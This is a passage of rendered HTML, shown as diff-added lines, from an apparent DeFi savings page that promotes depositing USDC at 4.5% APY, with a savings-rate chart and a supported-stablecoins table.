+                                          <svg viewBox="0 0 256 256" class="size-6 rounded-full border-base-white box-content border-2">
+                                             <image x="0" y="0" href="304eb4e4ab95263d35973d12fd4df2516e6a7386.svg" width="256" height="256"></image>
+                                          </svg>
+                                          <svg viewBox="0 0 256 256" class="size-6 rounded-full border-base-white box-content border-2">
+                                             <image x="0" y="0" href="30b3140887850c9a997cb472ff4eaa868570e920.svg" width="256" height="256"></image>
+                                          </svg>
+                                          <svg viewBox="0 0 256 256" class="size-6 rounded-full border-base-white box-content border-2">
+                                             <image x="0" y="0" href="dcb43064905930cb2fa12fe91e0fe0d276313d98.svg" width="256" height="256"></image>
+                                          </svg>
+                                          <svg viewBox="0 0 256 256" class="size-6 rounded-full border-base-white box-content border-2">
+                                             <image x="0" y="0" href="41888393a57295f0e7cadea9cb91081b85a7d181.svg" width="256" height="256"></image>
+                                          </svg>
+                                       </div>
+                                    </div>
+                                 </div>
+                              </button>
+                              <button class="relative flex-shrink-0 rounded-[10px] border border-primary bg-white shadow-xs hover:border-secondary hover:shadow-sm focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 mr-2 size-28 transition-all duration-200 ease-in-out" data-testid="savings-navigation-item">
+                                 <svg viewBox="0 0 256 256" class="absolute size-6 translate-x-4 -translate-y-10 transition-all duration-200 ease-in-out">
+                                    <image x="0" y="0" href="a98afbc8ed2e9e00f5a992c280ce921003d99c96.svg" width="256" height="256"></image>
+                                 </svg>
+                                 <div class="absolute flex flex-col items-start gap-0.5 translate-x-4 translate-y-6 transition-all duration-200 ease-in-out">
+                                    <div class="typography-label-3 text-primary" data-testid="savings-navigation-itemLabel">DAI</div>
+                                 </div>
+                              </button>
+                           </div>
+                        </div>
+                        <div class="grid grid-cols-1 gap-6">
+                           <section class="rounded-sm text-primary p-4 sm:p-5 md:p-8 flex flex-col justify-between gap-4 bg-cover bg-right bg-no-repeat bg-[url(/src/ui/assets/savings/accounts/usdc-bg.svg)] bg-primary-inverse min-h-[320px]" data-testid="savings-account-depositCTA-panel">
+                              <div class="typography-heading-3 md:typography-heading-2 inline-flex text-primary-inverse">
+                                 <div>
+                                    Deposit your USDC<br> and earn <span class="text-transparent bg-clip-text bg-[radial-gradient(103.52%_1308.64%_at_8.98%_83.33%,#FFFFFF_0%,#80D98D_18%,#2775CA_68.5%)]" data-testid="savings-account-depositCTA-apy" style="background-position: -142px -41px; background-size: 463px 96px;">4.5%</span> APY!
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-info mb-2 ml-1 inline text-tertiary" data-state="closed">
+                                       <circle cx="12" cy="12" r="10"></circle>
+                                       <path d="M12 16v-4"></path>
+                                       <path d="M12 8h.01"></path>
+                                    </svg>
+                                 </div>
+                              </div>
+                              <div class="grid grid-cols-1 gap-4 lg:grid-cols-[3fr_2fr]">
+                                 <div class="flex flex-col gap-2 lg:gap-4">
+                                    <div class="flex items-center gap-3">
+                                       <div class="flex w-fit items-center gap-1 rounded-full p-0.5 bg-[linear-gradient(90deg,rgb(42,78,92,0.2)_0%,rgb(42,78,92)_100%)]">
+                                          <div class="relative isolate w-fit">
+                                             <div class="isolate flex flex-row -space-x-2">
+                                                <svg viewBox="0 0 256 256" class="size-6 box-content border-2 border-[#1E3B33] rounded-full">
+                                                   <image x="0" y="0" href="30b3140887850c9a997cb472ff4eaa868570e920.svg" width="256" height="256"></image>
+                                                </svg>
+                                             </div>
+                                          </div>
+                                          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevrons-right icon-xs icon-primary-inverse">
+                                             <path d="m6 17 5-5-5-5"></path>
+                                             <path d="m13 17 5-5-5-5"></path>
+                                          </svg>
+                                          <div class="relative isolate w-fit">
+                                             <div class="isolate flex flex-row -space-x-2">
+                                                <svg viewBox="0 0 256 256" class="size-6 border-transparent box-content border-2">
+                                                   <image x="0" y="0" href="379fd47b6c4a52769342e69932a76e49b0d99de7.svg" width="256" height="256"></image>
+                                                </svg>
+                                             </div>
+                                          </div>
+                                       </div>
+                                    </div>
+                                    <div class="typography-body-3 flex max-w-[48ch] flex-col text-tertiary">
+                                       Deposit your stablecoins into USDC&nbsp;Savings to tap into the Sky&nbsp;Savings&nbsp;Rate, which grants you a transparent APY in USDC. 
+                                       <a rel="noopener noreferrer" class="bg-gradient-spark-secondary bg-clip-text hover:brightness-[90%] active:brightness-[80%] cursor-pointer rounded-[1px] focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 flex items-center gap-1 text-savings" href="https://docs.spark.fi/user-guides/earning-savings/susdc" target="_blank">
+                                          Learn more 
+                                          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-external-link icon-xxs">
+                                             <path d="M15 3h6v6"></path>
+                                             <path d="M10 14 21 3"></path>
+                                             <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+                                          </svg>
+                                       </a>
+                                    </div>
+                                 </div>
+                                 <div class="grid grid-cols-2 gap-4 mt-auto"><button class="relative isolate inline-flex select-none items-center justify-center overflow-hidden whitespace-nowrap rounded-sm transition-colors focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 before:-z-10 bg-gradient-spark-primary-1 text-primary-inverse before:absolute focus-visible:before:bg-primary active:before:bg-neutral-800 before:inset-0 before:transition-colors hover:before:bg-neutral-950 active:text-primary-inverse disabled:cursor-not-allowed disabled:text-neutral-500 disabled:before:bg-neutral-50 disabled:bg-gradient-to-r disabled:from-neutral-50 disabled:to-neutral-50 typography-button-1 h-12 px-3 py-3.5 gap-2" type="button">Connect Wallet</button><button class="relative isolate inline-flex select-none items-center justify-center overflow-hidden whitespace-nowrap rounded-sm transition-colors focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 bg-neutral-950 text-primary-inverse active:bg-neutral-950 hover:bg-neutral-800 active:text-primary-inverse disabled:cursor-not-allowed disabled:border-none disabled:bg-neutral-50 disabled:text-neutral-500 typography-button-1 h-12 px-3 py-3.5 gap-2" type="button">Try in Sandbox</button></div>
+                              </div>
+                           </section>
+                           <section class="rounded-sm bg-primary text-primary p-4 sm:p-5 md:p-8 flex min-h-[380px] w-full flex-1 flex-col justify-between self-stretch overflow-hidden">
+                              <div class="grid grid-cols-1 grid-rows-2 items-center gap-4 lg:grid-cols-2 lg:grid-rows-1">
+                                 <div class="typography-heading-5 flex items-center gap-1">Savings Rate</div>
+                                 <div class="ml-auto flex flex-nowrap gap-0.5 rounded-sm bg-secondary p-0.5 w-full lg:w-auto"><button class="typography-label-4 border border-transparent p-1.5 text-secondary xl:min-w-9 flex-1 rounded-[6px] transition-colors ease-in hover:bg-tertiary focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0">1M</button><button class="typography-label-4 border p-1.5 xl:min-w-9 flex-1 rounded-[6px] transition-colors ease-in focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 border-primary bg-primary text-primary shadow-xs hover:bg-primary">3M</button><button class="typography-label-4 border border-transparent p-1.5 text-secondary xl:min-w-9 flex-1 rounded-[6px] transition-colors ease-in hover:bg-tertiary focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0">1Y</button><button class="typography-label-4 border border-transparent p-1.5 text-secondary xl:min-w-9 flex-1 rounded-[6px] transition-colors ease-in hover:bg-tertiary focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0">All</button></div>
+                              </div>
+                              <div class="flex w-full flex-grow flex-col items-center justify-center">
+                                 <div class="w-full" style="">
+                                    <div style="position: relative; width: inherit; height: inherit;">
+                                       <div>
+                                          <svg width="1022" height="300">
+                                             <g class="visx-group" transform="translate(40, 40)">
+                                                <g class="visx-group visx-rows" transform="translate(0, 0)">
+                                                   <line class="visx-line" x1="0" y1="240" x2="962" y2="240" fill="transparent" shape-rendering="crispEdges" stroke="#D9D9D9" stroke-width="1" stroke-dasharray="3" pointer-events="none"></line>
+                                                   <line class="visx-line" x1="0" y1="210" x2="962" y2="210" fill="transparent" shape-rendering="crispEdges" stroke="#D9D9D9" stroke-width="1" stroke-dasharray="3" pointer-events="none"></line>
+                                                   <line class="visx-line" x1="0" y1="180" x2="962" y2="180" fill="transparent" shape-rendering="crispEdges" stroke="#D9D9D9" stroke-width="1" stroke-dasharray="3" pointer-events="none"></line>
+                                                   <line class="visx-line" x1="0" y1="150" x2="962" y2="150" fill="transparent" shape-rendering="crispEdges" stroke="#D9D9D9" stroke-width="1" stroke-dasharray="3" pointer-events="none"></line>
+                                                   <line class="visx-line" x1="0" y1="120" x2="962" y2="120" fill="transparent" shape-rendering="crispEdges" stroke="#D9D9D9" stroke-width="1" stroke-dasharray="3" pointer-events="none"></line>
+                                                   <line class="visx-line" x1="0" y1="90" x2="962" y2="90" fill="transparent" shape-rendering="crispEdges" stroke="#D9D9D9" stroke-width="1" stroke-dasharray="3" pointer-events="none"></line>
+                                                   <line class="visx-line" x1="0" y1="60" x2="962" y2="60" fill="transparent" shape-rendering="crispEdges" stroke="#D9D9D9" stroke-width="1" stroke-dasharray="3" pointer-events="none"></line>
+                                                   <line class="visx-line" x1="0" y1="29.99999999999997" x2="962" y2="29.99999999999997" fill="transparent" shape-rendering="crispEdges" stroke="#D9D9D9" stroke-width="1" stroke-dasharray="3" pointer-events="none"></line>
+                                                   <line class="visx-line" x1="0" y1="0" x2="962" y2="0" fill="transparent" shape-rendering="crispEdges" stroke="#D9D9D9" stroke-width="1" stroke-dasharray="3" pointer-events="none"></line>
+                                                </g>
+                                                <defs>
+                                                   <linearGradient id="area-gradient" x1="0" y1="0" x2="0" y2="1">
+                                                      <stop offset="0%" stop-color="#61B7A1" stop-opacity="0.5"></stop>
+                                                      <stop offset="100%" stop-color="#61B7A1" stop-opacity="0"></stop>
+                                                   </linearGradient>
+                                                </defs>
+                                                <path class="visx-area-closed" d="M0,45L10.931818181818182,45L10.931818181818182,45L21.863636363636363,45L21.863636363636363,45L32.79545454545454,45L32.79545454545454,45L43.72727272727273,45L43.72727272727273,45L54.65909090909091,45L54.65909090909091,45L65.59090909090908,45L65.59090909090908,45L76.52272727272727,45L76.52272727272727,45L87.45454545454545,45L87.45454545454545,45L98.38636363636364,45L98.38636363636364,45L109.31818181818181,45L109.31818181818181,45L120.25,45L120.25,45L131.18181818181816,45L131.18181818181816,45L142.11363636363637,45L142.11363636363637,45L153.04545454545453,45L153.04545454545453,45L163.97727272727272,45L163.97727272727272,45L174.9090909090909,45L174.9090909090909,45L185.8409090909091,45L185.8409090909091,45L196.77272727272728,45L196.77272727272728,45L207.70454545454547,45L207.70454545454547,45L218.63636363636363,45L218.63636363636363,45L229.56818181818184,45L229.56818181818184,45L240.5,45L240.5,105L251.43181818181816,105L251.43181818181816,105L262.3636363636363,105L262.3636363636363,105L273.29545454545456,105L273.29545454545456,105L284.22727272727275,105L284.22727272727275,105L295.15909090909093,105L295.15909090909093,105L306.09090909090907,105L306.09090909090907,105L317.02272727272725,105L317.02272727272725,105L327.95454545454544,105L327.95454545454544,105L338.8863636363637,105L338.8863636363637,105L349.8181818181818,105L349.8181818181818,105L360.75,105L360.75,105L371.6818181818182,105L371.6818181818182,105L382.6136363636363,105L382.6136363636363,105L393.54545454545456,105L393.54545454545456,105L404.47727272727275,105L404.47727272727275,105L415.40909090909093,105L415.40909090909093,105L426.34090909090907,105L426.34090909090907,105L437.27272727272725,105L437.27272727272725,105L448.20454545454544,105L448.20454545454544,105L459.1363636363637,105L459.1363636363637,105L470.0681818181818,105L470.0681818181818,105L481,105L481,105L491.9318181818182,105L491.9318181818182,105L502.8636363636363,105L502.8636363636363,105L513.7954545454545,105L513.7954545454545,105L524.7272727272726,105L524.7272727272726,105L535.6590909090909,105L535.6590909090909,105L546.5909090909091,105L546.5909090909091,105L557.5227272727274,105L557.5227272727274,105L568.4545454545455,105L568.4545454545455,105L579.3863636363636,105L579.3863636363636,105L590.3181818181819,105L590.3181818181819,105L601.25,105L601.25,105L612.1818181818181,105L612.1818181818181,105L623.1136363636364,105L623.1136363636364,105L634.0454545454545,105L634.0454545454545,105L644.9772727272726,105L644.9772727272726,105L655.9090909090909,105L655.9090909090909,105L666.8409090909091,105L666.8409090909091,105L677.7727272727274,105L677.7727272727274,105L688.7045454545455,105L688.7045454545455,105L699.6363636363636,105L699.6363636363636,105L710.5681818181819,105L710.5681818181819,105L721.5,105L721.5,105L732.4318181818181,105L732.4318181818181,105L743.3636363636364,105L743.3636363636364,105L754.2954545454545,105L754.2954545454545,105L765.2272727272726,105L765.2272727272726,105L776.1590909090909,105L776.1590909090909,105L787.0909090909091,105L787.0909090909091,105L798.0227272727274,105L798.0227272727274,105L808.9545454545455,105L808.9545454545455,105L819.8863636363636,105L819.8863636363636,105L830.8181818181819,105L830.8181818181819,105L841.75,105L841.75,105L852.6818181818181,105L852.6818181818181,105L863.6136363636364,105L863.6136363636364,105L874.5454545454545,105L874.5454545454545,105L885.4772727272726,105L885.4772727272726,105L896.4090909090909,105L896.4090909090909,105L907.3409090909091,105L907.3409090909091,105L918.2727272727274,105L918.2727272727274,105L929.2045454545455,105L929.2045454545455,105L940.1363636363636,105L940.1363636363636,105L951.0681818181819,105L951.0681818181819,105L962,105L962,105L962,240L962,240L951.0681818181819,240L951.0681818181819,240L940.1363636363636,240L940.1363636363636,240L929.2045454545455,240L929.2045454545455,240L918.2727272727274,240L918.2727272727274,240L907.3409090909091,240L907.3409090909091,240L896.4090909090909,240L896.4090909090909,240L885.4772727272726,240L885.4772727272726,240L874.5454545454545,240L874.5454545454545,240L863.6136363636364,240L863.6136363636364,240L852.6818181818181,240L852.6818181818181,240L841.75,240L841.75,240L830.8181818181819,240L830.8181818181819,240L819.8863636363636,240L819.8863636363636,240L808.9545454545455,240L808.9545454545455,240L798.0227272727274,240L798.0227272727274,240L787.0909090909091,240L787.0909090909091,240L776.1590909090909,240L776.1590909090909,240L765.2272727272726,240L765.2272727272726,240L754.2954545454545,240L754.2954545454545,240L743.3636363636364,240L743.3636363636364,240L732.4318181818181,240L732.4318181818181,240L721.5,240L721.5,240L710.5681818181819,240L710.5681818181819,240L699.6363636363636,240L699.6363636363636,240L688.7045454545455,240L688.7045454545455,240L677.7727272727274,240L677.7727272727274,240L666.8409090909091,240L666.8409090909091,240L655.9090909090909,240L655.9090909090909,240L644.9772727272726,240L644.9772727272726,240L634.0454545454545,240L634.0454545454545,240L623.1136363636364,240L623.1136363636364,240L612.1818181818181,240L612.1818181818181,240L601.25,240L601.25,240L590.3181818181819,240L590.3181818181819,240L579.3863636363636,240L579.3863636363636,240L568.4545454545455,240L568.4545454545455,240L557.5227272727274,240L557.5227272727274,240L546.5909090909091,240L546.5909090909091,240L535.6590909090909,240L535.6590909090909,240L524.7272727272726,240L524.7272727272726,240L513.7954545454545,240L513.7954545454545,240L502.8636363636363,240L502.8636363636363,240L491.9318181818182,240L491.9318181818182,240L481,240L481,240L470.0681818181818,240L470.0681818181818,240L459.1363636363637,240L459.1363636363637,240L448.20454545454544,240L448.20454545454544,240L437.27272727272725,240L437.27272727272725,240L426.34090909090907,240L426.34090909090907,240L415.40909090909093,240L415.40909090909093,240L404.47727272727275,240L404.47727272727275,240L393.54545454545456,240L393.54545454545456,240L382.6136363636363,240L382.6136363636363,240L371.6818181818182,240L371.6818181818182,240L360.75,240L360.75,240L349.8181818181818,240L349.8181818181818,240L338.8863636363637,240L338.8863636363637,240L327.95454545454544,240L327.95454545454544,240L317.02272727272725,240L317.02272727272725,240L306.09090909090907,240L306.09090909090907,240L295.15909090909093,240L295.15909090909093,240L284.22727272727275,240L284.22727272727275,240L273.29545454545456,240L273.29545454545456,240L262.3636363636363,240L262.3636363636363,240L251.43181818181816,240L251.43181818181816,240L240.5,240L240.5,240L229.56818181818184,240L229.56818181818184,240L218.63636363636363,240L218.63636363636363,240L207.70454545454547,240L207.70454545454547,240L196.77272727272728,240L196.77272727272728,240L185.8409090909091,240L185.8409090909091,240L174.9090909090909,240L174.9090909090909,240L163.97727272727272,240L163.97727272727272,240L153.04545454545453,240L153.04545454545453,240L142.11363636363637,240L142.11363636363637,240L131.18181818181816,240L131.18181818181816,240L120.25,240L120.25,240L109.31818181818181,240L109.31818181818181,240L98.38636363636364,240L98.38636363636364,240L87.45454545454545,240L87.45454545454545,240L76.52272727272727,240L76.52272727272727,240L65.59090909090908,240L65.59090909090908,240L54.65909090909091,240L54.65909090909091,240L43.72727272727273,240L43.72727272727273,240L32.79545454545454,240L32.79545454545454,240L21.863636363636363,240L21.863636363636363,240L10.931818181818182,240L10.931818181818182,240L0,240Z" stroke-width="2" fill="url(#area-gradient)"></path>
+                                                <path class="visx-linepath" d="M0,45L10.931818181818182,45L10.931818181818182,45L21.863636363636363,45L21.863636363636363,45L32.79545454545454,45L32.79545454545454,45L43.72727272727273,45L43.72727272727273,45L54.65909090909091,45L54.65909090909091,45L65.59090909090908,45L65.59090909090908,45L76.52272727272727,45L76.52272727272727,45L87.45454545454545,45L87.45454545454545,45L98.38636363636364,45L98.38636363636364,45L109.31818181818181,45L109.31818181818181,45L120.25,45L120.25,45L131.18181818181816,45L131.18181818181816,45L142.11363636363637,45L142.11363636363637,45L153.04545454545453,45L153.04545454545453,45L163.97727272727272,45L163.97727272727272,45L174.9090909090909,45L174.9090909090909,45L185.8409090909091,45L185.8409090909091,45L196.77272727272728,45L196.77272727272728,45L207.70454545454547,45L207.70454545454547,45L218.63636363636363,45L218.63636363636363,45L229.56818181818184,45L229.56818181818184,45L240.5,45L240.5,105L251.43181818181816,105L251.43181818181816,105L262.3636363636363,105L262.3636363636363,105L273.29545454545456,105L273.29545454545456,105L284.22727272727275,105L284.22727272727275,105L295.15909090909093,105L295.15909090909093,105L306.09090909090907,105L306.09090909090907,105L317.02272727272725,105L317.02272727272725,105L327.95454545454544,105L327.95454545454544,105L338.8863636363637,105L338.8863636363637,105L349.8181818181818,105L349.8181818181818,105L360.75,105L360.75,105L371.6818181818182,105L371.6818181818182,105L382.6136363636363,105L382.6136363636363,105L393.54545454545456,105L393.54545454545456,105L404.47727272727275,105L404.47727272727275,105L415.40909090909093,105L415.40909090909093,105L426.34090909090907,105L426.34090909090907,105L437.27272727272725,105L437.27272727272725,105L448.20454545454544,105L448.20454545454544,105L459.1363636363637,105L459.1363636363637,105L470.0681818181818,105L470.0681818181818,105L481,105L481,105L491.9318181818182,105L491.9318181818182,105L502.8636363636363,105L502.8636363636363,105L513.7954545454545,105L513.7954545454545,105L524.7272727272726,105L524.7272727272726,105L535.6590909090909,105L535.6590909090909,105L546.5909090909091,105L546.5909090909091,105L557.5227272727274,105L557.5227272727274,105L568.4545454545455,105L568.4545454545455,105L579.3863636363636,105L579.3863636363636,105L590.3181818181819,105L590.3181818181819,105L601.25,105L601.25,105L612.1818181818181,105L612.1818181818181,105L623.1136363636364,105L623.1136363636364,105L634.0454545454545,105L634.0454545454545,105L644.9772727272726,105L644.9772727272726,105L655.9090909090909,105L655.9090909090909,105L666.8409090909091,105L666.8409090909091,105L677.7727272727274,105L677.7727272727274,105L688.7045454545455,105L688.7045454545455,105L699.6363636363636,105L699.6363636363636,105L710.5681818181819,105L710.5681818181819,105L721.5,105L721.5,105L732.4318181818181,105L732.4318181818181,105L743.3636363636364,105L743.3636363636364,105L754.2954545454545,105L754.2954545454545,105L765.2272727272726,105L765.2272727272726,105L776.1590909090909,105L776.1590909090909,105L787.0909090909091,105L787.0909090909091,105L798.0227272727274,105L798.0227272727274,105L808.9545454545455,105L808.9545454545455,105L819.8863636363636,105L819.8863636363636,105L830.8181818181819,105L830.8181818181819,105L841.75,105L841.75,105L852.6818181818181,105L852.6818181818181,105L863.6136363636364,105L863.6136363636364,105L874.5454545454545,105L874.5454545454545,105L885.4772727272726,105L885.4772727272726,105L896.4090909090909,105L896.4090909090909,105L907.3409090909091,105L907.3409090909091,105L918.2727272727274,105L918.2727272727274,105L929.2045454545455,105L929.2045454545455,105L940.1363636363636,105L940.1363636363636,105L951.0681818181819,105L951.0681818181819,105L962,105L962,105" fill="transparent" stroke-linecap="round" stroke="#61B7A1" stroke-width="2"></path>
+                                                <g class="visx-group visx-axis visx-axis-bottom" transform="translate(0, 235)">
+                                                   <g class="visx-group visx-axis-tick" transform="translate(0, 0)">
+                                                      <line class="visx-line" x1="331.14299242424244" y1="0" x2="331.14299242424244" y2="8" fill="transparent" shape-rendering="crispEdges" stroke="#222" stroke-width="0" stroke-linecap="square"></line>
+                                                      <svg x="0" y="4" font-size="10" style="overflow: visible;">
+                                                         <text transform="" x="331.14299242424244" y="18" fill="#6A7692" font-size="10" text-anchor="middle">
+                                                            <tspan x="331.14299242424244" dy="0em">April</tspan>
+                                                         </text>
+                                                      </svg>
+                                                   </g>
+                                                   <g class="visx-group visx-axis-tick" transform="translate(0, 0)">
+                                                      <line class="visx-line" x1="659.0975378787879" y1="0" x2="659.0975378787879" y2="8" fill="transparent" shape-rendering="crispEdges" stroke="#222" stroke-width="0" stroke-linecap="square"></line>
+                                                      <svg x="0" y="4" font-size="10" style="overflow: visible;">
+                                                         <text transform="" x="659.0975378787879" y="18" fill="#6A7692" font-size="10" text-anchor="middle">
+                                                            <tspan x="659.0975378787879" dy="0em">May</tspan>
+                                                         </text>
+                                                      </svg>
+                                                   </g>
+                                                   <line class="visx-line visx-axis-line" x1="0.5" y1="0" x2="962.5" y2="0" fill="transparent" shape-rendering="crispEdges" stroke="#222" stroke-width="0"></line>
+                                                </g>
+                                                <g class="visx-group visx-axis visx-axis-left" transform="translate(0, 0)">
+                                                   <g class="visx-group visx-axis-tick" transform="translate(0, 0)">
+                                                      <line class="visx-line" x1="0" y1="240" x2="-8" y2="240" fill="transparent" shape-rendering="crispEdges" stroke="#222" stroke-width="0" stroke-linecap="square"></line>
+                                                      <svg x="-30" y="3" font-size="10" style="overflow: visible;">
+                                                         <text transform="" x="-8" y="240" fill="#6A7692" font-size="10" text-anchor="start">
+                                                            <tspan x="-8" dy="0em">0%</tspan>
+                                                         </text>
+                                                      </svg>
+                                                   </g>
+                                                   <g class="visx-group visx-axis-tick" transform="translate(0, 0)">
+                                                      <line class="visx-line" x1="0" y1="180" x2="-8" y2="180" fill="transparent" shape-rendering="crispEdges" stroke="#222" stroke-width="0" stroke-linecap="square"></line>
+                                                      <svg x="-30" y="3" font-size="10" style="overflow: visible;">
+                                                         <text transform="" x="-8" y="180" fill="#6A7692" font-size="10" text-anchor="start">
+                                                            <tspan x="-8" dy="0em">2%</tspan>
+                                                         </text>
+                                                      </svg>
+                                                   </g>
+                                                   <g class="visx-group visx-axis-tick" transform="translate(0, 0)">
+                                                      <line class="visx-line" x1="0" y1="120" x2="-8" y2="120" fill="transparent" shape-rendering="crispEdges" stroke="#222" stroke-width="0" stroke-linecap="square"></line>
+                                                      <svg x="-30" y="3" font-size="10" style="overflow: visible;">
+                                                         <text transform="" x="-8" y="120" fill="#6A7692" font-size="10" text-anchor="start">
+                                                            <tspan x="-8" dy="0em">4%</tspan>
+                                                         </text>
+                                                      </svg>
+                                                   </g>
+                                                   <g class="visx-group visx-axis-tick" transform="translate(0, 0)">
+                                                      <line class="visx-line" x1="0" y1="60" x2="-8" y2="60" fill="transparent" shape-rendering="crispEdges" stroke="#222" stroke-width="0" stroke-linecap="square"></line>
+                                                      <svg x="-30" y="3" font-size="10" style="overflow: visible;">
+                                                         <text transform="" x="-8" y="60" fill="#6A7692" font-size="10" text-anchor="start">
+                                                            <tspan x="-8" dy="0em">6%</tspan>
+                                                         </text>
+                                                      </svg>
+                                                   </g>
+                                                   <g class="visx-group visx-axis-tick" transform="translate(0, 0)">
+                                                      <line class="visx-line" x1="0" y1="0" x2="-8" y2="0" fill="transparent" shape-rendering="crispEdges" stroke="#222" stroke-width="0" stroke-linecap="square"></line>
+                                                      <svg x="-30" y="3" font-size="10" style="overflow: visible;">
+                                                         <text transform="" x="-8" y="0" fill="#6A7692" font-size="10" text-anchor="start">
+                                                            <tspan x="-8" dy="0em">8%</tspan>
+                                                         </text>
+                                                      </svg>
+                                                   </g>
+                                                   <line class="visx-line visx-axis-line" x1="0" y1="240.5" x2="0" y2="0.5" fill="transparent" shape-rendering="crispEdges" stroke="#222" stroke-width="0"></line>
+                                                </g>
+                                                <rect class="visx-bar" width="962" height="240" fill="transparent"></rect>
+                                             </g>
+                                          </svg>
+                                       </div>
+                                    </div>
+                                 </div>
+                              </div>
+                           </section>
+                           <section class="rounded-sm bg-primary text-primary p-0">
+                              <div class="flex flex-col gap-6 p-4 md:px-8 md:py-6 pb-0 md:pb-0">
+                                 <h3 class="typography-heading-4 text-primary">Supported stablecoins</h3>
+                                 <div class="w-full">
+                                    <table class="typography-body-3 w-full caption-bottom">
+                                       <thead class="sticky top-0 isolate z-10 bg-primary [&amp;_tr]:border-b">
+                                          <tr class="border-b transition-colors data-[state=selected]:bg-secondary grid w-full gap-2 grid-cols-[repeat(2,_1fr)_120px] sm:grid-cols-[repeat(2,_1fr)_140px]">
+                                             <th class="bg-white py-2 text-left align-middle text-secondary [&amp;:has([role=checkbox])]:pr-0">
+                                                <div class="flex flex-row"><span class="typography-label-4 h-4 text-secondary ">Token</span></div>
+                                             </th>
+                                             <th class="bg-white py-2 text-left align-middle text-secondary [&amp;:has([role=checkbox])]:pr-0">
+                                                <div class="flex flex-row justify-end"><span class="typography-label-4 h-4 text-secondary ">Balance</span></div>
+                                             </th>
+                                             <th class="bg-white py-2 text-left align-middle text-secondary [&amp;:has([role=checkbox])]:pr-0">
+                                                <div class="flex flex-row"><span class="typography-label-4 h-4 text-secondary "></span></div>
+                                             </th>
+                                          </tr>
+                                       </thead>
+                                       <tbody class="[&amp;_tr:last-child]:border-0">
+                                          <tr class="border-b transition-colors data-[state=selected]:bg-secondary grid w-full items-center gap-2 grid-cols-[repeat(2,_1fr)_120px] sm:grid-cols-[repeat(2,_1fr)_140px]" data-testid="component-DataTable-row-0">
+                                             <td class="py-4 align-middle [&amp;:has([role=checkbox])]:pr-0">
+                                                <div class="typography-label-2 flex flex-row items-center gap-2">
+                                                   <div class="relative isolate w-fit">
+                                                      <div class="isolate flex flex-row -space-x-2">
+                                                         <svg viewBox="0 0 256 256" class="size-6">
+                                                            <image x="0" y="0" href="30b3140887850c9a997cb472ff4eaa868570e920.svg" width="256" height="256"></image>
+                                                         </svg>
+                                                      </div>
+                                                   </div>
+                                                   USDC
+                                                </div>
+                                             </td>
+                                             <td class="py-4 align-middle [&amp;:has([role=checkbox])]:pr-0">
+                                                <div class="typography-label-2 flex w-full flex-row justify-end">-</div>
+                                             </td>
+                                             <td class="py-4 align-middle [&amp;:has([role=checkbox])]:pr-0">
+                                                <div class="flex justify-end gap-1 sm:gap-3">
+                                                   <button disabled="" class="relative isolate inline-flex select-none items-center justify-center overflow-hidden whitespace-nowrap rounded-sm transition-colors focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 bg-neutral-950 text-primary-inverse active:bg-neutral-950 hover:bg-neutral-800 active:text-primary-inverse disabled:cursor-not-allowed disabled:border-none disabled:bg-neutral-50 disabled:text-neutral-500 typography-button-2 h-8 p-2 gap-2" type="button">Deposit</button>
+                                                   <button data-testid="savings-supportedStablecoins-moreDropdown" id="radix-:rc:" aria-haspopup="menu" aria-expanded="false" data-state="closed" class="relative isolate inline-flex select-none items-center justify-center overflow-hidden whitespace-nowrap rounded-sm transition-colors focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 border border-primary border-solid bg-primary text-neutral-950 shadow-xs hover:bg-neutral-50 active:bg-neutral-100 disabled:cursor-not-allowed disabled:border-none disabled:bg-neutral-50 disabled:text-neutral-500 typography-button-2 h-8 gap-2 aspect-square p-2" type="button">
+                                                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-ellipsis-vertical icon-xs">
+                                                         <circle cx="12" cy="12" r="1"></circle>
+                                                         <circle cx="12" cy="5" r="1"></circle>
+                                                         <circle cx="12" cy="19" r="1"></circle>
+                                                      </svg>
+                                                   </button>
+                                                </div>
+                                             </td>
+                                          </tr>
+                                       </tbody>
+                                    </table>
+                                 </div>
+                              </div>
+                              <div class="w-full gap-6 border-primary border-t p-4 md:px-8 md:py-6" data-testid="component-ConvertStablesPanel">
+                                 <div class="grid grid-cols-[1fr_auto] items-center gap-3">
+                                    <div class="flex items-center gap-3">
+                                       <img src="sky-B8F8ajQt.svg" class="h-8 w-8 rounded-full border-2 border-[#DBCAF4]">
+                                       <div class="flex flex-col">
+                                          <div class="typography-label-3 text-primary">Convert stablecoins without fees and slippage!</div>
+                                          <div class="typography-body-4 text-secondary">Use SKY infrastructure to convert between supported stablecoins.</div>
+                                       </div>
+                                    </div>
